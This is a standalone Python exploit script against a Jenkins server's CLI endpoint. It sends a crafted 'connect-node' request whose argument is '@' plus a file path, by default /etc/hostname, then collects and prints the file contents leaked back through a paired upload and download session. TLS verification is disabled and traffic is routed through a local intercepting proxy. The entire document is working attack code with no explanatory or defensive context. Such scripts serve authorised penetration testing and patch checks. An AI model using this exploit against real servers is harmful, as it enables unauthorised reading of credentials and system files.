#!/usr/bin/env python

import uuid

import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# proxies = {"http": "", "http": ""}

# url = sys.argv[1]
# file = sys.argv[2]

jenkins_url = "http://localhost:1234"
file = "/etc/hostname"


data_parts = [
    b"\x00\x00\x00\x0e\x00\x00\x0cconnect-node",
    b"\x00\x00\x00\x10\x00\x00\x0e@",
    file.encode(),
    b"\x00\x00\x00\x07\x02\x00\x05UTF-8\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03",
]
post_data = b"".join(data_parts)
cli_url = jenkins_url + "/cli?remoting=false"

print(f"[i] Target URL {cli_url}")


# Upload Request
def upload_req(session_id):
    upload_response = session.post(
        url=cli_url,
        headers={
            "Session": session_id,
            "Side": "upload",
            "Content-Type": "application/octet-stream",
        },
        verify=False,
        data=post_data,
        proxies=proxies,
    )
    upload_response.raise_for_status()


# Download Request
def download_req(session_id):
    download_response = session.post(
        url=cli_url,
        headers={
            "Session": session_id,
            "Side": "download",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        verify=False,
        proxies=proxies,
    )
    download_response.raise_for_status()

    print("[+] Found data, printing...")
    print("")
    print(f"{download_response.text}")


try:
    session = requests.Session()
    session_id = str(uuid.uuid4())

    upload_req(session_id)
    download_req(session_id)

except KeyboardInterrupt:
    print("^C, Exiting")

except Exception as e:
    print(f"Exception raised: {e}")
